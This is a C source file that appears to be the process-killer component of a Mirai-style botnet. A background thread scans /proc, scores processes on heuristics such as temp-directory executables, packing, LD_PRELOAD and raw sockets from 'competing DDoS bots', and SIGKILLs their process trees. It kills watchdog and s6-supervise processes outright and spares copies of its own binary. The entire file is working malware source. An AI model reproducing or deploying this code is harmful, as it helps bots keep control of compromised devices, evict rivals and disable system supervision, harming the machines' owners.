#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syslog.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "headers/killer.h"

#define SUSPICION_THRESHOLD 3
#define HIGH_CPU_THRESHOLD  20000000
#define CACHE_SIZE          512
#define CACHE_EXPIRE_SECS   120
#define YOUNG_PROC_SECS     3
#define SCAN_INTERVAL_SECS  5

static pid_t safe_pids[CACHE_SIZE];
static int safe_count = 0;
static time_t cache_time = 0;

static pid_t killed_pids[CACHE_SIZE];
static int killed_count = 0;

static pid_t my_pid = 0;

static const char *whitelisted_paths[] = {
    "/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/",
    "/lib/", "/usr/lib/", "/usr/lib64/",
    "/usr/local/", "/opt/", "/etc/",
    NULL
};

static const char *blacklisted_comms[] = {
    "watchdog", "s6-supervise",
    NULL
};

static int read_file(const char *path, char *buf, size_t size) {
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    size_t n = fread(buf, 1, size - 1, f);
    if (n == 0 && ferror(f)) { fclose(f); return -1; }
    buf[n] = '\0';
    fclose(f);
    return (int)n;
}

static void chomp(char *s) {
    size_t len = strlen(s);
    if (len && s[len-1] == '\n') s[len-1] = '\0';
}

static int is_cached_safe(pid_t pid) {
    for (int i = 0; i < safe_count; i++)
        if (safe_pids[i] == pid) return 1;
    return 0;
}

static void add_to_safe(pid_t pid) {
    if (safe_count < CACHE_SIZE)
        safe_pids[safe_count++] = pid;
}

static int is_already_killed(pid_t pid) {
    for (int i = 0; i < killed_count; i++)
        if (killed_pids[i] == pid) return 1;
    return 0;
}

static void mark_killed(pid_t pid) {
    if (killed_count < CACHE_SIZE)
        killed_pids[killed_count++] = pid;
}

static void cache_expire(void) {
    time_t now = time(NULL);
    if (now - cache_time >= CACHE_EXPIRE_SECS) {
        safe_count = 0;
        cache_time = now;
    }
}

static int is_whitelisted(const char *exe) {
    if (!exe) return 0;
    for (int i = 0; whitelisted_paths[i]; i++)
        if (strncmp(exe, whitelisted_paths[i], strlen(whitelisted_paths[i])) == 0)
            return 1;
    return 0;
}

static int is_system_path(const char *exe) {
    if (!exe) return 1;
    if (strncmp(exe, "/usr", 4) == 0) return 1;
    if (strncmp(exe, "/bin", 4) == 0) return 1;
    if (strncmp(exe, "/sbin", 5) == 0) return 1;
    if (strncmp(exe, "/lib", 4) == 0) return 1;
    if (strstr(exe, "/systemd")) return 1;
    return 0;
}

static int is_blacklisted_comm(const char *comm) {
    if (!comm) return 0;
    for (int i = 0; blacklisted_comms[i]; i++)
        if (strstr(comm, blacklisted_comms[i]))
            return 1;
    return 0;
}

static int is_temp_path(const char *p) {
    if (!p) return 0;
    return strstr(p, "/tmp") || strstr(p, "/dev/shm") || strstr(p, "/var/tmp") || strstr(p, "/run/");
}

static int check_deleted(const char *exe) {
    return exe && strstr(exe, "(deleted)");
}

static int check_memfd(const char *exe) {
    return exe && (strstr(exe, "/memfd:") || strstr(exe, "memfd:"));
}

static int check_packed(const char *path) {
    if (!path) return 0;
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    char buf[8] = {0};
    fread(buf, 1, 7, f);
    fclose(f);
    return strstr(buf, "UPX") != NULL;
}

static int check_perms(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) return 0;
    if (st.st_mode & S_IWOTH) return 1;
    return !S_ISREG(st.st_mode);
}

static int check_symlink_abuse(const char *exe) {
    if (!exe) return 0;
    struct stat st;
    if (lstat(exe, &st) != 0) return 0;
    if (S_ISLNK(st.st_mode)) {
        char target[PATH_MAX];
        ssize_t len = readlink(exe, target, sizeof(target)-1);
        if (len > 0) {
            target[len] = '\0';
            if (is_temp_path(target)) return 1;
        }
    }
    return 0;
}

static int check_random_name(const char *cmd) {
    if (!cmd || strlen(cmd) < 2) return 0;
    int len = 0, consonants = 0, digits = 0;
    for (int i = 0; cmd[i] && i < 16; i++) {
        char c = cmd[i];
        if (c == ' ' || c == '/') break;
        len++;
        if (isdigit(c)) digits++;
        else if (isalpha(c)) {
            c = tolower(c);
            if (c != 'a' && c != 'e' && c != 'i' && c != 'o' && c != 'u')
                consonants++;
        }
    }
    if (len >= 6 && consonants >= 5) return 1;
    if (len >= 4 && digits >= len - 1) return 1;
    return 0;
}

static int check_interpreter_abuse(const char *exe, const char *cmdline) {
    if (!exe || !cmdline) return 0;
    if (strstr(exe, "/sh") || strstr(exe, "/bash") || strstr(exe, "/dash") || strstr(exe, "busybox"))
        if (is_temp_path(cmdline)) return 1;
    return 0;
}

static int check_cron_spawn(pid_t ppid, const char *exe) {
    if (!exe) return 0;
    char parent_exe[256] = {0};
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/exe", ppid);
    if (readlink(path, parent_exe, sizeof(parent_exe)-1) <= 0) return 0;
    if (strstr(parent_exe, "cron") && is_temp_path(exe)) return 1;
    return 0;
}

static int check_young_process(pid_t pid, const char *exe) {
    if (!exe || !is_temp_path(exe)) return 0;
    struct stat st;
    char path[128];
    snprintf(path, sizeof(path), "/proc/%d", pid);
    if (stat(path, &st) != 0) return 0;
    return (time(NULL) - st.st_ctime) < YOUNG_PROC_SECS;
}

/* Combine /proc/pid/status reads: TracerPid, VmSize, SigCgt in one pass */
static int proc_status_score(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    char buf[2048];
    if (read_file(path, buf, sizeof(buf)) <= 0) return 0;
    int score = 0;
    unsigned long vmsize = 0, sigcgt = 0;
    char *line = buf;
    int tracer = 0;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        if (strncmp(line, "TracerPid:", 10) == 0)
            tracer = atoi(line + 10);
        else if (sscanf(line, "VmSize: %lu kB", &vmsize) == 1)
            ;
        else if (sscanf(line, "SigCgt: %lx", &sigcgt) == 1)
            ;
        if (nl) line = nl + 1; else break;
    }
    if (tracer) score++;
    if (vmsize > 0 && vmsize < 2000) score++;
    if (sigcgt & 0x4001) score++;
    return score;
}

/* Read /proc/pid/stat once and extract CPU ticks + ppid */
static int stat_cpu_check(pid_t pid, pid_t *ppid_out) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/stat", pid);
    char buf[2048];
    if (read_file(path, buf, sizeof(buf)) <= 0) return 0;
    char *after = strrchr(buf, ')');
    if (!after) return 0;
    after++;
    long ut = 0, st = 0;
    pid_t ppid = 0;
    int field = 0;
    char *token = strtok(after, " ");
    while (token) {
        field++;
        if (field == 2) ppid = (pid_t)strtol(token, NULL, 10);
        else if (field == 12) ut = strtol(token, NULL, 10);
        else if (field == 13) st = strtol(token, NULL, 10);
        token = strtok(NULL, " ");
    }
    if (ppid_out) *ppid_out = ppid;
    return (ut + st) > HIGH_CPU_THRESHOLD;
}

static int system_ld_preload_exists(void) {
    struct stat st;
    return stat("/etc/ld.so.preload", &st) == 0;
}

/* Process-level LD_PRELOAD in environ */
static int check_ld_preload(pid_t pid) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/environ", pid);
    char buf[4096];
    if (read_file(path, buf, sizeof(buf)) <= 0) return 0;
    return memmem(buf, sizeof(buf), "LD_PRELOAD=", 11) != NULL ? 1 : 0;
}

/* Check for raw/packet sockets (competing DDoS bots) */
static int check_suspicious_socket(pid_t pid) {
    char fd_path[128];
    snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd", pid);
    DIR *d = opendir(fd_path);
    if (!d) return 0;
    struct dirent *e;
    char link[256];
    int suspicious = 0;
    while ((e = readdir(d)) && !suspicious) {
        if (e->d_name[0] == '.') continue;
        char full[PATH_MAX];
        snprintf(full, sizeof(full), "%s/%s", fd_path, e->d_name);
        ssize_t len = readlink(full, link, sizeof(link)-1);
        if (len <= 0) continue;
        link[len] = '\0';
        if (strstr(link, "socket:[")) {
            if (strstr(link, "raw") || strstr(link, "packet:"))
                suspicious = 1;
        }
    }
    closedir(d);
    return suspicious;
}

/* Check if process is in a different namespace (container escape) */
static int check_namespace(pid_t pid) {
    struct stat ns1, nsp;
    char path[128];
    snprintf(path, sizeof(path), "/proc/1/ns/pid");
    if (stat(path, &ns1) != 0) return 0;
    snprintf(path, sizeof(path), "/proc/%d/ns/pid", pid);
    if (stat(path, &nsp) != 0) return 0;
    return ns1.st_ino != nsp.st_ino ? 1 : 0;
}

/* Check if /proc/pid/maps is empty (process hiding) */
static int check_hidden_maps(pid_t pid) {
    char path[128];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    char line[256];
    FILE *f = fopen(path, "r");
    if (!f) return 1;
    int lines = 0;
    while (fgets(line, sizeof(line), f)) lines++;
    fclose(f);
    return lines == 0 ? 1 : 0;
}

/* Suspicious name: cmd says systemd/init but exe is not */
static int suspicious_name(const char *exe, const char *cmd) {
    if (!exe || !cmd) return 0;
    if ((strstr(cmd, "systemd") || strstr(cmd, "kthreadd") || strstr(cmd, "init"))
        && !strstr(exe, "systemd") && !strstr(exe, "init"))
        return 1;
    return 0;
}

static void kill_tree(pid_t pid) {
    pid_t queue[4096];
    int head = 0, tail = 0;
    queue[tail++] = pid;
    while (head < tail) {
        pid_t cur = queue[head++];
        if (cur <= 0) continue;
        kill(cur, SIGKILL);
        char path[64], buf[4096];
        snprintf(path, sizeof(path), "/proc/%d/task/%d/children", cur, cur);
        if (read_file(path, buf, sizeof(buf)) > 0) {
            char *saveptr;
            char *token = strtok_r(buf, " ", &saveptr);
            while (token) {
                pid_t child = (pid_t)strtol(token, NULL, 10);
                if (child > 0 && child != cur && tail < 4096)
                    queue[tail++] = child;
                token = strtok_r(NULL, " ", &saveptr);
            }
        }
    }
}

static int inspect_pid(pid_t pid) {
    if (pid == my_pid) return 0;
    if (is_already_killed(pid)) return 0;
    if (is_cached_safe(pid)) return 0;

    char exe[PATH_MAX] = {0};
    int have_exe = 0;
    {
        char link[64];
        snprintf(link, sizeof(link), "/proc/%d/exe", pid);
        ssize_t len = readlink(link, exe, sizeof(exe)-1);
        if (len > 0) { exe[len] = '\0'; have_exe = 1; }
    }

    char cmdline[1024] = {0};
    {
        char p[64];
        snprintf(p, sizeof(p), "/proc/%d/cmdline", pid);
        FILE *f = fopen(p, "r");
        if (f) {
            size_t n = fread(cmdline, 1, sizeof(cmdline)-1, f);
            fclose(f);
            for (size_t i = 0; i < n; i++)
                if (cmdline[i] == '\0') cmdline[i] = ' ';
        }
    }

    { /* Owner check: non-root only inspects own processes */
        struct stat st;
        char p[64];
        snprintf(p, sizeof(p), "/proc/%d", pid);
        if (stat(p, &st) != 0) return 0;
        uid_t me = getuid();
        if (st.st_uid != me && me != 0) {
            add_to_safe(pid);
            return 0;
        }
    }

    { /* Friends: skip processes running the same binary (prevents persistence loop) */
        if (have_exe) {
            char self_exe[PATH_MAX] = {0};
            readlink("/proc/self/exe", self_exe, sizeof(self_exe)-1);
            char self_clean[PATH_MAX] = {0}, exe_clean[PATH_MAX] = {0};
            strncpy(self_clean, self_exe, sizeof(self_clean)-1);
            strncpy(exe_clean, exe, sizeof(exe_clean)-1);
            char *p;
            if ((p = strstr(self_clean, " (deleted)"))) *p = '\0';
            if ((p = strstr(exe_clean, " (deleted)"))) *p = '\0';
            if (*self_clean && *exe_clean && strcmp(self_clean, exe_clean) == 0) {
                add_to_safe(pid);
                return 0;
            }
        }
    }

    /* Blacklisted comms → kill immediately */
    {
        char comm[64] = {0};
        char p[64];
        snprintf(p, sizeof(p), "/proc/%d/comm", pid);
        if (read_file(p, comm, sizeof(comm)) > 0) {
            chomp(comm);
            if (is_blacklisted_comm(comm)) return 1;
        }
    }

    /* Whitelist/system → safe, no further checks */
    if (have_exe && (is_whitelisted(exe) || is_system_path(exe))) {
        add_to_safe(pid);
        return 0;
    }

    /* ---- scoring ---- */
    int score = 0;

    /* Cheap string/stat checks first (no file reads beyond exe/cmdline already fetched) */
    if (have_exe) {
        if (check_deleted(exe))       { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
        if (is_temp_path(exe))        { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
        if (check_memfd(exe))         { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
        if (check_perms(exe))         { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
        if (check_symlink_abuse(exe)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
    } else {
        score++; if (score >= SUSPICION_THRESHOLD) goto kill;
    }

    /* Name heuristics */
    if (suspicious_name(exe, cmdline)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
    if (check_random_name(cmdline))    { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
    if (check_interpreter_abuse(exe, cmdline)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Single /proc/pid/status read for TracerPid + VmSize + SigCgt */
    { int s = proc_status_score(pid); score += s; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Single /proc/pid/stat read for CPU + ppid */
    pid_t ppid = 0;
    if (stat_cpu_check(pid, &ppid)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Packed check (7-byte read of exe) — cheap enough, only one process at a time */
    if (have_exe && check_packed(exe)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Parent checks */
    if (ppid == 1 && !strstr(cmdline, "systemd")) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }
    if (check_cron_spawn(ppid, exe)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Young temp process */
    if (check_young_process(pid, exe)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* System-wide LD_PRELOAD */
    if (system_ld_preload_exists()) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Process-level LD_PRELOAD rootkit */
    if (check_ld_preload(pid)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Namespace isolation (container escape / sandbox evasion) */
    if (check_namespace(pid)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Hidden /proc/pid/maps (process hiding via LD_PRELOAD wrapper) */
    if (check_hidden_maps(pid)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Raw/packet sockets — competing DDoS bots, sniffers, MITM tools */
    if (check_suspicious_socket(pid)) { score++; if (score >= SUSPICION_THRESHOLD) goto kill; }

    /* Passed all checks — cache as safe */
    add_to_safe(pid);
    return 0;

kill:
    return 1;
}

static void *killer_thread(void *arg) {
    (void)arg;
    cache_time = time(NULL);

    while (1) {
        cache_expire();
        DIR *proc = opendir("/proc");
        if (!proc) { sleep(1); continue; }

        struct dirent *entry;
        while ((entry = readdir(proc))) {
            if (!isdigit(entry->d_name[0])) continue;
            pid_t pid = (pid_t)strtol(entry->d_name, NULL, 10);
            if (pid <= 1 || pid == my_pid) continue;

            if (inspect_pid(pid)) {
                kill_tree(pid);
                mark_killed(pid);
            }
        }
        closedir(proc);
        sleep(SCAN_INTERVAL_SECS);
    }
    return NULL;
}

int start_killer(void) {
    my_pid = getpid();
    pthread_t t;
    if (pthread_create(&t, NULL, killer_thread, NULL) != 0)
        return -1;
    pthread_detach(t);
    return 0;
}
